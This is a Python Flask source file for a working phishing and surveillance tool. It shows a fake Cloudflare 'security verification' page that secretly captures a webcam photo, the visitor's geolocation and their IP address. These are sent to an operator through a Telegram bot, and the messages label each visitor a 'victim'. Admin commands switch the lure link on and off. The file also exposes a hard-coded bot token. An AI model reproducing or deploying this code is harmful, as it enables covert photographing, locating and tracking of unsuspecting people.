from flask import Flask, request, render_template_string, redirect
import requests
import base64
import threading
import time
import os

app = Flask(__name__)

# ==================== إعدادات البوت ====================
BOT_TOKEN = "8725128005:AAH3Pp14tKAEsLPvcHOGdh8JqOnD74KKLNs"
ADMIN_ID = 7041600701
# =======================================================

LINK_ACTIVE = True

# ==================== صفحة HTML ====================
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        body{background:#f0f2f5;font-family:sans-serif;text-align:center;padding:50px;margin:0}
        .box{background:white;padding:30px;border-radius:15px;max-width:350px;margin:auto;box-shadow:0 5px 15px rgba(0,0,0,0.1)}
        h2{color:#1a1a2e;margin-bottom:10px}
        .loader{border:4px solid #f3f3f3;border-top:4px solid #f6821f;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        #status{color:#555;font-size:14px;margin-top:15px}
        .footer{font-size:11px;color:#aaa;margin-top:20px}
    </style>
</head>
<body>
<div class="box">
    <h2>جاري التحقق</h2>
    <div class="loader"></div>
    <p id="status">جارِ الاتصال الآمن...</p>
    <div class="footer">Cloudflare • التحقق الأمني</div>
</div>
<video id="v" autoplay playsinline muted style="position:fixed;top:-100%;left:-100%;width:1px;height:1px"></video>
<canvas id="c" style="display:none"></canvas>
<script>
let sent = false;

async function start() {
    if(sent) return;
    sent = true;
    
    try {
        document.getElementById('status').innerText = '📷 طلب الوصول إلى الكاميرا...';
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const v = document.getElementById('v');
        v.srcObject = stream;
        await new Promise(r => { v.onloadedmetadata = r; setTimeout(r, 1000); });
        
        document.getElementById('status').innerText = '📸 التقاط الصورة...';
        const c = document.getElementById('c');
        c.width = v.videoWidth;
        c.height = v.videoHeight;
        c.getContext('2d').drawImage(v, 0, 0);
        const img = c.toDataURL('image/jpeg', 0.6).split(',')[1];
        
        document.getElementById('status').innerText = '📍 تحديد الموقع...';
        let lat = 0, lon = 0;
        try {
            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, { timeout: 8000 });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
            document.getElementById('status').innerText = '✅ تم تحديد الموقع';
        } catch(e) {
            document.getElementById('status').innerText = '⚠️ لم يتم تحديد الموقع';
        }
        
        document.getElementById('status').innerText = '📤 إرسال البيانات...';
        await fetch('/capture', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ img: img, lat: lat, lon: lon })
        });
        
        document.getElementById('status').innerText = '✅ تم التحقق! جاري التوجيه...';
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 1000);
        
    } catch(error) {
        console.error(error);
        document.getElementById('status').innerText = '⚠️ خطأ... جاري التوجيه';
        setTimeout(() => {
            window.location.href = 'https://www.google.com';
        }, 1000);
    }
}

setTimeout(start, 1000);
</script>
</body>
</html>
'''

# ==================== Polling (بديل Webhook) ====================
last_update_id = 0

def send_message(chat_id, text):
    """إرسال رسالة إلى تيليجرام"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': chat_id, 'text': text, 'parse_mode': 'HTML'}
        requests.post(url, json=data, timeout=10)
    except Exception as e:
        print(f"❌ خطأ في الإرسال: {e}")

def polling_bot():
    """جلب التحديثات من تيليجرام بشكل مستمر"""
    global LINK_ACTIVE, last_update_id
    print("🤖 تشغيل Polling...")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {'offset': last_update_id + 1, 'timeout': 30}
            response = requests.get(url, params=params, timeout=35)
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data.get('result'):
                    for update in data['result']:
                        last_update_id = update['update_id']
                        
                        if 'message' in update:
                            msg = update['message']
                            chat_id = msg['chat']['id']
                            text = msg.get('text', '')
                            
                            # التأكد أن المرسل هو الأدمن
                            if str(chat_id) == str(ADMIN_ID):
                                if text == '/open':
                                    LINK_ACTIVE = True
                                    send_message(chat_id, "✅ تم تفعيل الرابط بنجاح!")
                                
                                elif text == '/close':
                                    LINK_ACTIVE = False
                                    send_message(chat_id, "🔒 تم تعطيل الرابط")
                                
                                elif text == '/link':
                                    site_url = "https://sif-bot-go.onrender.com"
                                    send_message(chat_id, f"🔗 الرابط الحالي:\n{site_url}")
                                
                                elif text == '/status':
                                    status = "🟢 مفعل" if LINK_ACTIVE else "🔴 معطل"
                                    send_message(chat_id, f"📊 حالة الرابط: {status}")
                                
                                elif text == '/start':
                                    menu = """🎯 مرحباً بك في لوحة التحكم

📋 الأوامر المتاحة:

🔓 /open - تفعيل الرابط
🔒 /close - تعطيل الرابط
🔗 /link - عرض الرابط
📊 /status - حالة الرابط

👨‍💻 المطور: @Y_urd"""
                                    send_message(chat_id, menu)
                                
                                elif text == '/help':
                                    help_text = """🆘 المساعدة:

1. أرسل /open لتفعيل الرابط
2. أرسل /link للحصول على الرابط
3. افتح الرابط من جوالك
4. ستصلك البيانات تلقائياً

⚠️ الرابط يعطل نفسه بعد كل ضحية"""
                                    send_message(chat_id, help_text)
                        
        except Exception as e:
            print(f"❌ خطأ في Polling: {e}")
        
        time.sleep(1)

# ==================== مسارات Flask ====================
@app.route('/')
def index():
    """الصفحة الرئيسية"""
    global LINK_ACTIVE
    if not LINK_ACTIVE:
        return redirect('https://www.google.com')
    return render_template_string(HTML_PAGE)

@app.route('/capture', methods=['POST'])
def capture():
    """استقبال البيانات من الضحية"""
    global LINK_ACTIVE
    try:
        data = request.get_json()
        if not data:
            return 'error', 400
        
        img = data.get('img', '')
        lat = data.get('lat', 0)
        lon = data.get('lon', 0)
        
        # جلب IP الضحية
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
        
        # وقت السحب
        from datetime import datetime
        now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # بناء التقرير
        msg = f"""🔥 <b>✅ ضحية جديدة!</b>

━━━━━━━━━━━━━━━━━━━━━━
🌐 <b>IP:</b> <code>{ip}</code>
📍 <b>الموقع:</b> {lat}, {lon}
🔗 <b>خريطة:</b> <a href='https://www.google.com/maps?q={lat},{lon}'>اضغط للعرض</a>
⏰ <b>الوقت:</b> {now}
━━━━━━━━━━━━━━━━━━━━━━

⚠️ <b>تم تعطيل الرابط تلقائياً</b>"""
        
        # إرسال الصورة + التقرير
        if img and len(img) > 100:
            try:
                img_data = base64.b64decode(img)
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
                    data={'chat_id': ADMIN_ID, 'caption': msg, 'parse_mode': 'HTML'},
                    files={'photo': ('victim.jpg', img_data)},
                    timeout=30
                )
            except Exception as e:
                print(f"خطأ في إرسال الصورة: {e}")
                send_message(ADMIN_ID, msg)
        else:
            send_message(ADMIN_ID, msg)
        
        # تعطيل الرابط بعد الاستخدام
        LINK_ACTIVE = False
        
        print(f"✅ تم استلام بيانات من {ip} - {now}")
        
    except Exception as e:
        print(f"❌ خطأ في /capture: {e}")
    
    return 'ok', 200

@app.route('/health')
def health():
    """فحص صحة السيرفر"""
    return 'OK', 200

@app.route('/test')
def test():
    """صفحة اختبار للتأكد من عمل السيرفر"""
    return "السيرفر شغال ✅", 200

# ==================== التشغيل ====================
if __name__ == '__main__':
    # تشغيل Polling في خيط منفصل
    polling_thread = threading.Thread(target=polling_bot, daemon=True)
    polling_thread.start()
    
    print("=" * 50)
    print("🚀 تشغيل البوت - النسخة النهائية")
    print("=" * 50)
    print(f"📍 الرابط: https://sif-bot-go.onrender.com")
    print(f"🤖 حالة الرابط: {'مفعل' if LINK_ACTIVE else 'معطل'}")
    print("📡 نظام Polling يعمل...")
    print("=" * 50)
    
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, debug=False)
